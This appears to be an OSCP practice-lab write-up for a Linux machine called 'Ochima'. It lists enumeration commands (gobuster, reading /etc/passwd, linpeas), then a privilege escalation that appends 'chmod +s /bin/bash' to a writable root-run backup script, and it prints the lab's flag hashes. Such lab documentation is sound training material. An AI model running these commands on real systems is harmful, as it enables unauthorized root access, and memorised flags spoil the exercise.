...
![OSCP - Ochima - Linux - image1](/files/OSCP%20-%20Ochima%20-%20Linux%20-%20image1.png)
- Ran `gobuster dir -u http://192.168.117.32 -w //usr/share/dirb/wordlists/big.txt` to enumerate web directories
![OSCP - Ochima - Linux - image2](/files/OSCP%20-%20Ochima%20-%20Linux%20-%20image2.png)
...
![OSCP - Ochima - Linux - image4](/files/OSCP%20-%20Ochima%20-%20Linux%20-%20image4.png)
---
# Lateral Movement to user
## Local Enumeration
- Ran `cat /home/snort/local.txt` to print `a00aea52796dcd16e3d4e840f16bd277`
![OSCP - Ochima - Linux - image5](/files/OSCP%20-%20Ochima%20-%20Linux%20-%20image5.png)
- Ran `cat /etc/passwd` to enumerate users
![OSCP - Ochima - Linux - image6](/files/OSCP%20-%20Ochima%20-%20Linux%20-%20image6.png)
- Ran `sudo -l` and found `sudo` requires `snort` password
![OSCP - Ochima - Linux - image7](/files/OSCP%20-%20Ochima%20-%20Linux%20-%20image7.png)
- Uploaded & ran `linpeas.sh`
![OSCP - Ochima - Linux - image8](/files/OSCP%20-%20Ochima%20-%20Linux%20-%20image8.png)
- Identified interesting files
![OSCP - Ochima - Linux - image9](/files/OSCP%20-%20Ochima%20-%20Linux%20-%20image9.png)
- Identified possible private SSH keys
![OSCP - Ochima - Linux - image10](/files/OSCP%20-%20Ochima%20-%20Linux%20-%20image10.png)
- Identified interesting writeable files including `/var/backups/etc_Backup.sh`
![OSCP - Ochima - Linux - image11](/files/OSCP%20-%20Ochima%20-%20Linux%20-%20image11.png)
---
# Privilege Escalation
- Ran `ls -lah /var/backups/etc_Backup.sh` to identify script privileges
![OSCP - Ochima - Linux - image12](/files/OSCP%20-%20Ochima%20-%20Linux%20-%20image12.png)
- Ran `echo "chmod +s /bin/bash" >> /var/backups/etc_Backup.sh` to add command to script to change set privileges for `/bin/bash`
![OSCP - Ochima - Linux - image13](/files/OSCP%20-%20Ochima%20-%20Linux%20-%20image13.png)
- Waited a few minutes for script, then ran `/bin/bash -p` to achieve `root`
![OSCP - Ochima - Linux - image14](/files/OSCP%20-%20Ochima%20-%20Linux%20-%20image14.png)
- Ran `cat /root/proof.txt` to print `8f730f4db61f48dd3810007f95fa9e61`
![OSCP - Ochima - Linux - image15](/files/OSCP%20-%20Ochima%20-%20Linux%20-%20image15.png)
---
# Trophy & Loot
